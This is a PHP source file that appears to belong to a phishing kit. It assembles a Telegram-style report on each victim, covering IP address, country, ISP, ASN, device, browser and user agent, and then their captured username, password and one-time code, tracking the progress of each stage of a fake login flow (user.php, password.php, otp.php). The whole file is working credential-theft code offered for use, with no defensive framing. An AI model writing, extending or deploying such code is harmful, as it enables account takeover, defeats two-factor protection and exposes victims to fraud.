<?php
require_once(__DIR__ . '/formatting.php');
$alert['saved'] = '<blockquote>✅</blockquote>';
$alert['updated'] = '<blockquote>🔔</blockquote>';
$alert['denied'] = '<blockquote>⛔</blockquote>';
$alert['waiting'] = '<blockquote>🔄️</blockquote>';

if(isset($_SESSION['step-1'])){
$message = '<blockquote>'.$activity['status'].countryCodeToFlagEmoji($_SESSION['user_data']['countryCode']).deviceNameToEmoji($_SESSION['device']).' <b> <code>'.$_SESSION['user_data']['query'].'</code> </b></blockquote><blockquote><b>'.$activity['step'].'</b></blockquote> 
<b>COUNTRY:</b> '.$_SESSION['user_data']['countryCode'].'
<b>ISP:</b> '.$_SESSION['user_data']['isp'].'
<b>ORG:</b> '.$_SESSION['user_data']['org'].'
<b>ASN:</b> '.$_SESSION['user_data']['as'].'
<b>DEVICE:</b> '.$_SESSION['device'].'
<b>BROWSER:</b> '.$_SESSION['browser'].'
<b>OS:</b> '.$_SESSION['os'].'
<b>USER AGENT:</b> <span class="tg-spoiler">'.$_SERVER['HTTP_USER_AGENT'].'</span>';
}

if(isset($_SESSION['step-2'])){

if(!isset($_SESSION['login_counter'])) $_SESSION['login_counter'] = 0;

$message .= '

<blockquote><b>👤 USERNAME ('.numberToEmoji($_SESSION['login_counter']).')</b> </blockquote>';

if(isset($_SESSION['step-3']) && basename($_SERVER['SCRIPT_FILENAME']) != 'user.php'){
    $message .= $alert['saved'];
}elseif(isset($_POST['username']) && basename($_SERVER['SCRIPT_FILENAME']) == 'user.php'){
    $message .= $alert['updated'];
}elseif(isset($_SESSION['login_err']) && basename($_SERVER['SCRIPT_FILENAME']) == 'user.php'){
    $message .= $alert['denied'];
}

if(isset($_SESSION['username'])){
$message .= '<b>USERNAME:</b> <code>'.$_SESSION['username'].'</code>';
}else{
    $message .= $alert['waiting'];
}
}

if(isset($_SESSION['step-3'])){

if(!isset($_SESSION['pwd_counter'])) $_SESSION['pwd_counter'] = 0;

$message .= '

<blockquote><b>🔑 PASSWORD ('.numberToEmoji($_SESSION['pwd_counter']).')</b> </blockquote>';

if(isset($_SESSION['step-4']) && basename($_SERVER['SCRIPT_FILENAME']) != 'password.php'){
    $message .= $alert['saved'];
}elseif(isset($_POST['pwd']) && basename($_SERVER['SCRIPT_FILENAME']) == 'password.php'){
    $message .= $alert['updated'];
}elseif(isset($_SESSION['pwd_err']) && basename($_SERVER['SCRIPT_FILENAME']) == 'password.php'){
    $message .= $alert['denied'];
}

if(isset($_SESSION['password'])){
$message .= '<b>PASSWORD:</b> <code>'.$_SESSION['password'].'</code>';
}else{
    $message .= $alert['waiting'];
}
}

if(isset($_SESSION['step-4'])){

if(!isset($_SESSION['otp_counter'])) $_SESSION['otp_counter'] = 0;

$message .= '

<blockquote><b>📲 G-CODE ('.numberToEmoji($_SESSION['otp_counter']).')</b> </blockquote>';

if(isset($_SESSION['complete']) && basename($_SERVER['SCRIPT_FILENAME']) != 'otp.php'){
    $message .= $alert['saved'];
}elseif(isset($_POST['otp']) && basename($_SERVER['SCRIPT_FILENAME']) == 'otp.php'){
    $message .= $alert['updated'];
}elseif(isset($_SESSION['otp_err']) && basename($_SERVER['SCRIPT_FILENAME']) == 'otp.php'){
    $message .= $alert['denied'];
}

if(isset($_SESSION['otp'])){
$message .= '<b>OTP:</b> <code>'.$_SESSION['otp'].'</code>';
}else{
    $message .= $alert['waiting'];
}
}

?>
    
